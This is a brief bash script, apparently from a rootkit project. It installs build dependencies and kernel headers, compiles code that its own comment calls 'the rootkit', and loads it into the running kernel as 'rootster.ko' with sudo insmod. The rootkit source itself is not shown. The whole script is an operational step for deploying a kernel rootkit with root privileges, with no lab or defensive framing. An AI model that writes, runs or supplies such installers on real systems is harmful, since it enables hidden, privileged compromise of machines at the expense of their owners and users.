#!/bin/bash

# Install necessary build dependencies 
sudo apt install build-essential linux-headers-$(uname -r) -y

# Build the rootkit
make clean ; make 

# Insert kernel module
sudo insmod rootster.ko
